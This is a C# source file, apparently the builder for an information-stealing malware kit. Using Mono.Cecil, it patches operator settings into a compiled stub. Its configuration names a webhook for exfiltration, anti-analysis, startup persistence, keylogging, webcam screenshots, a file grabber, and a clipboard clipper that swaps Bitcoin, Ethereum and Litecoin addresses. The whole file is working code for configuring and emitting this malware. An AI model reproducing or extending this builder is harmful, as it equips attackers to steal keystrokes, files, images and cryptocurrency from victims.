using Mono.Cecil;
using Mono.Cecil.Cil;
using System.IO;

namespace BuilderGUI
{
    internal sealed class Build
    {
        private static readonly Random random = new();

        public static readonly Dictionary<string, string> ConfigValues = new()
        {
            {"Webhook", ""},
            {"Debug", ""},
            {"AntiAnalysis", ""},
            {"Startup", ""},
            {"StartDelay", ""},
            {"ClipperBTC", ""},
            {"ClipperETH", ""},
            {"ClipperLTC", ""},
            {"WebcamScreenshot", ""},
            {"Keylogger", ""},
            {"Clipper", ""},
            {"Grabber", ""},
            {"Mutex", RandomString(20)}
        };

        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static AssemblyDefinition ReadStub(string stubPath)
        {
            if (!File.Exists(stubPath))
                throw new FileNotFoundException("Stub file not found.", stubPath);

            return AssemblyDefinition.ReadAssembly(stubPath);
        }

        private static void WriteStub(AssemblyDefinition definition, string outputPath)
        {
            definition.Write(outputPath);
        }

        private static string ReplaceConfigParams(string value)
        {
            foreach (KeyValuePair<string, string> config in ConfigValues)
            {
                if (value.Equals($"--- {config.Key} ---"))
                {
                    return config.Value;
                }
            }

            return value;
        }

        public static AssemblyDefinition IterValues(AssemblyDefinition definition)
        {
            foreach (ModuleDefinition module in definition.Modules)
            {
                foreach (TypeDefinition type in module.Types)
                {
                    if (type.Name.Equals("Config"))
                    {
                        foreach (MethodDefinition method in type.Methods)
                        {
                            if (method.IsConstructor && method.HasBody)
                            {
                                foreach (Instruction instruction in method.Body.Instructions)
                                {
                                    if (instruction.OpCode.Code == Code.Ldstr &&
                                        instruction.Operand is string operand &&
                                        operand.StartsWith("---") && operand.EndsWith("---"))
                                    {
                                        instruction.Operand = ReplaceConfigParams(operand);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            return definition;
        }

        public static string BuildStub(string outputPath, string stubPath)
        {
            AssemblyDefinition definition = ReadStub(stubPath);
            definition = IterValues(definition);
            WriteStub(definition, outputPath);
            return outputPath;
        }
    }
}
